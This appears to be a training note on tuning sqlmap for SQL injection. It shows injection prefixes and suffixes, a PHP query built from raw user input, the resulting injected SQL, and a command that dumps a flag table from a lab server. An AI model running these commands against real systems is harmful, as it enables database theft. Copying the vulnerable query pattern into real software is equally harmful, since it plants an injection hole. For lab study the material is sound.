- Each payload consists of: vector and boundaries
	- Vectors: carry the SQL code to be executed at the target (UNION ALL SELECT 1,2 VERSION())
	- Boundaries: prefixes and suffixes used for proper injection of the vector into the vulnerable SQL statement

## Suffixes/Prefixes
- Sometimes we need to add prefixes and suffixes to fine tune the SQL attack vector
```bash
# Enclose everything between the prefix and the suffix
sqlmap -U $URL/?q=test --prefix="%'))" --suffix="-- -"
```

- For example, if we have something like:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```
	The vector UNION ALL SELECT 1,2,VERSION(), enclosed by prefix=%')) and suffix=-- -, will result in the following SQL statement:	
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

### Level/Risk
- --Level ( 1-5, default 1): The higher the lever, the broader the boundaries and vectors, based on the expectancy of success (lower expectancy, higher level)
- --Risk (1-3, default 1): extends the vectors based on the risk causing problem (DOS, database deletion, etc)

### UNION SQLi Tuning
- We can use `--union-cols` to specify the number of columns
- Similarly, we can use `--union-from=$TABLE` to specify the name of table
```bash
sqlmap -u http://157.245.32.216:30308/case7.php?id=1 --batch --dump -D testdb -T flag7 --union-cols=5 --union-from=flag7
```
